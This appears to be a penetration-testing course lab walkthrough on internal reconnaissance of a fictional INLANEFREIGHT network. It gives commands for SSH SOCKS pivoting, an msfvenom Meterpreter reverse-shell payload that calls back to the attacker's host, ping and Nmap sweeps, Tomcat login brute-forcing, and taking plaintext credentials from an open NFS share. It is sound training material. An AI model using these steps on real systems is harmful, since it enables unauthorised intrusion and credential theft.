# Section 8 — Internal Information Gathering

> First phase of the internal pentest. Set up pivoting through dmz01 into the 172.16.8.0/23 network, discover live hosts, enumerate services, and hunt for credentials to fuel lateral movement.

---

## Methodology — Pivot, Discover, Enumerate

Now that we have persistent root SSH access to dmz01 (dual-homed at 172.16.8.120), the internal pentest follows the same pattern as external — but everything routes through the pivot host:

1. Set up tunneling (SSH SOCKS proxy or Meterpreter routes)
2. Discover live hosts (ping sweep)
3. Port scan each host
4. Enumerate interesting services
5. Hunt for credentials and misconfigurations

---

## Step 1 — Set Up SSH Dynamic Port Forwarding

### Create the SOCKS Proxy

```bash
ssh -D 8081 -i dmz01_key root@10.129.203.111
```
> `-D 8081` opens a SOCKS proxy on port 8081 on your localhost. All traffic sent through this port gets forwarded through the SSH tunnel to dmz01, which then routes it to the internal network. This turns dmz01 into a proxy server — any tool that supports SOCKS (or Proxychains) can now reach 172.16.8.0/23.

### Verify the Tunnel

```bash
netstat -antp | grep 8081
```
> Confirms that SSH is listening on port 8081 locally. You should see `127.0.0.1:8081 LISTEN`.

### Configure Proxychains

Edit `/etc/proxychains.conf` — set the last line to:

```
socks4  127.0.0.1 8081
```
> Proxychains wraps any command and forces its network traffic through the SOCKS proxy. This lets you use tools like Nmap, curl, enum4linux, and even Metasploit modules through the tunnel.

### Test the Tunnel

```bash
proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
```
> Scan dmz01's internal IP through the proxy to confirm everything works. Must use `-sT` (TCP connect scan) because SOCKS proxies don't support raw packets — SYN scans (`-sS`) won't work through Proxychains.

Module connection: **Pivoting, Tunneling, and Port Forwarding** (Dynamic Port Forwarding with SSH and SOCKS Tunneling).

---

## Alternative — Metasploit Pivoting

If you prefer Metasploit's routing, you can set up a Meterpreter session instead.

### Generate Payload

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=443 -f elf > shell.elf
```
> Creates a Linux Meterpreter reverse shell binary. Module connection: **Shells & Payloads** (MSFvenom), **Metasploit Framework**.

### Transfer to Target

```bash
scp -i dmz01_key shell.elf root@10.129.203.111:/tmp
```
> SCP uses the existing SSH key for file transfer. No need for HTTP servers or manual downloads.

### Catch the Shell

In Metasploit:

```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 443
exploit
```

On target:

```bash
chmod +x /tmp/shell.elf && /tmp/shell.elf
```

### Set Up Routing

```
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.8.0
run
```
> Autoroute reads the compromised host's routing table and adds routes so Metasploit modules can reach internal subnets through the Meterpreter session. Routes added: `172.16.0.0/16`, `172.17.0.0/16`, `172.18.0.0/16`.

> **SSH vs Meterpreter pivoting:** SSH dynamic forwarding is simpler, works with any tool via Proxychains, and doesn't require Metasploit. Meterpreter routing is useful when you want to use Metasploit's built-in modules (scanners, exploits) directly. Both work — pick whichever fits your workflow. On the exam, SSH is more reliable.

---

## Step 2 — Host Discovery

### Option A — Meterpreter Ping Sweep

```
use post/multi/gather/ping_sweep
set RHOSTS 172.16.8.0/23
set SESSION 1
run
```

### Option B — Bash Ping Sweep from dmz01

```bash
for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
```
> Fires off parallel pings with 1-second timeout (`-W1`) across the /24. Fast and doesn't require any extra tools. For the /23, run it for both 172.16.8.x and 172.16.9.x.

### Live Hosts Discovered

| IP | TTL | Likely OS |
|----|-----|-----------|
| 172.16.8.3 | 128 | Windows (Domain Controller) |
| 172.16.8.20 | 128 | Windows |
| 172.16.8.50 | 128 | Windows |
| 172.16.8.120 | 64 | Linux (dmz01 — us) |

> TTL 128 = Windows, TTL 64 = Linux. Quick OS fingerprinting without service detection.

---

## Step 3 — Port Scanning Internal Hosts

### Upload Static Nmap to dmz01

Transfer a static Nmap binary to the pivot host using any file transfer method (SCP, wget from HTTP server, etc.). Run it directly from dmz01 to avoid the speed penalty of Proxychains.

```bash
./nmap --open -iL live_hosts
```
> Scans default top ports against all live hosts. Running from dmz01 is faster than scanning through the SOCKS proxy because there's no tunneling overhead.

### Results Summary

| Host | Open Ports | Assessment |
|------|-----------|------------|
| **172.16.8.3** | 53 (DNS), 88 (Kerberos), 135 (RPC), 139/445 (SMB), 389/636 (LDAP), 464 (kpasswd), 593 | **Domain Controller** — leave for later, unlikely directly exploitable |
| **172.16.8.20** | 80 (HTTP), 111 (rpcbind), 135 (RPC), 139/445 (SMB), 2049 (NFS), 3389 (RDP) | **Windows host with NFS + web app** — NFS is unusual on Windows, investigate |
| **172.16.8.50** | 135 (RPC), 139/445 (SMB), 3389 (RDP), 8080 (HTTP) | **Windows host with Tomcat** — brute-force manager login |

> The thought process: DC is the end goal but you don't attack it directly. Work the member servers first — find credentials, escalate privileges, then use those to attack AD.

---

## Step 4 — Quick AD Checks

### SMB NULL Session on DC

```bash
proxychains enum4linux -U -P 172.16.8.3
```
> Tests for anonymous/NULL session access to the Domain Controller. If successful, you could dump the password policy (to safely spray) and user list (targets for spraying). `-U` enumerates users, `-P` dumps password policy.

**Result:** The DC allows NULL sessions (we get the domain SID: `S-1-5-21-2814148634-3729814499-1637837074`, domain name: `INLANEFREIGHT`), but user enumeration and password policy retrieval are blocked with `NT_STATUS_ACCESS_DENIED`.

**Verdict:** Dead end for now. Come back with credentials for authenticated enumeration.

> Without a password policy, password spraying is risky — you could lock out accounts. Without a user list, you'd need to build one from OSINT, SMTP VRFY results, or other sources. Not worth the risk at this point when we have other leads.

---

## Step 5 — Enumerate 172.16.8.50 (Tomcat)

### Brute-Force Tomcat Manager

Port 8080 shows Tomcat 10 (latest version — no public exploits). Try brute-forcing the manager login:

```bash
proxychains msfconsole
```

In Metasploit:

```
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 172.16.8.50
set STOP_ON_SUCCESS true
run
```
> Uses Metasploit's built-in Tomcat credential list. Module connection: **Attacking Common Applications** (Attacking Tomcat).

**Result:** All login attempts fail. Tomcat manager is properly secured.

**Verdict:** Dead end. On an internal pentest, Tomcat is only worth reporting if you can actually get in with weak creds. Seeing it internally is normal.

---

## Step 6 — Enumerate 172.16.8.20 (DNN + NFS)

### Check NFS Exports

```bash
proxychains showmount -e 172.16.8.20
```
> Lists NFS exports. NFS on a Windows host is unusual and often misconfigured.

**Result:** `/DEV01 (everyone)` — world-readable export. Anyone can mount it.

### Mount the NFS Share (from dmz01)

```bash
mkdir /tmp/DEV01
mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
cd /tmp/DEV01
ls
```
> Can't mount NFS through Proxychains (it uses raw NFS protocol, not TCP), so mount directly from dmz01 which has direct network access. The share contains DNN-related files.

**Result:** Directory listing shows build scripts, config XML files, and a `DNN/` subdirectory.

### Pillage the web.config File

```bash
cat /tmp/DEV01/DNN/web.config
```

**Credentials found:**

```xml
<username>Administrator</username>
<password>
  <value>D0tn31Nuk3R0ck$$@123</value>
</password>
```

> Config files are one of the top credential sources during any engagement. `web.config` in .NET apps, `wp-config.php` in WordPress, `.env` files, `application.properties` in Java — always check config files in every share and directory you access.

**Credentials:** `Administrator:D0tn31Nuk3R0ck$$@123` (DNN admin)

**Findings:**
- NFS Share Accessible to Everyone (High) — anonymous access to development files
- Credentials in Configuration File (Critical) — plaintext admin password in web.config

---

## Step 7 — Passive Network Sniffing (tcpdump)

```bash
tcpdump -i ens192 -s 65535 -w ilfreight_pcap
```
> Capture all traffic on the internal interface. `-i ens192` targets the internal NIC. `-s 65535` captures full packets (not truncated). `-w` writes to a pcap file for later analysis in Wireshark. Run for a few minutes, then Ctrl+C to stop.

**Result:** No interesting cleartext traffic captured in this lab. On a real engagement, especially on a user VLAN, you might capture LLMNR/NBT-NS hashes, cleartext HTTP credentials, SNMP community strings, or other valuable data.

> Always try this when you have root on a pivoting host — it's free information gathering. Transfer the pcap to your attack host with SCP and open in Wireshark.

---

## What We Have Now

| Item | Value |
|------|-------|
| Pivot | Root SSH on dmz01 (172.16.8.120) with SOCKS proxy on port 8081 |
| Internal hosts | 172.16.8.3 (DC), 172.16.8.20 (DEV01), 172.16.8.50 (Windows) |
| Domain | INLANEFREIGHT, SID: S-1-5-21-2814148634-3729814499-1637837074 |
| New creds | `Administrator:D0tn31Nuk3R0ck$$@123` (DNN) |
| Dead ends | SMB NULL session (access denied for users/policy), Tomcat brute-force (failed) |

---

## Attack Chain So Far

```
External → monitoring.inlanefreight.local → cmd injection → reverse shell
  → webdev → adm group → audit logs → srvadm creds
  → SSH as srvadm → sudo openssl → root SSH key → PERSISTENT ROOT
  → SSH SOCKS proxy (-D 8081) into 172.16.8.0/23
  → Ping sweep → 3 live hosts (DC, DEV01, Windows)
  → Nmap → DC ports, DEV01 has NFS + HTTP, .50 has Tomcat
  → SMB NULL on DC → domain name/SID but no users or policy
  → Tomcat brute-force on .50 → dead end
  → NFS mount on DEV01 → web.config → DNN admin creds
  → NEXT: log into DNN → exploit for foothold on DEV01 → AD creds
```

---

## Exam Relevance

- **SSH dynamic port forwarding is the most reliable pivot method** — memorize the command: `ssh -D <port> -i <key> user@host`
- **Proxychains only works with TCP connect scans** (`-sT`) — SYN scans and UDP scans won't work through SOCKS
- **Static Nmap on the pivot host** is faster than scanning through Proxychains — upload one early
- **NFS misconfiguration** is a common internal finding — always check `showmount -e` when port 2049 is open
- **Config files are credential goldmines** — web.config, wp-config.php, .env, application.properties, database.yml. Check every one you find
- **Packet capture is free intel** — run tcpdump whenever you have root on a network-connected host, even if you don't expect to find anything
- **Don't tunnel-vision on the DC** — it's the end goal, but you reach it by compromising member servers and harvesting credentials first
- **Dead ends are valuable** — documenting what didn't work (NULL session, Tomcat brute-force) prevents wasted time later and shows thoroughness
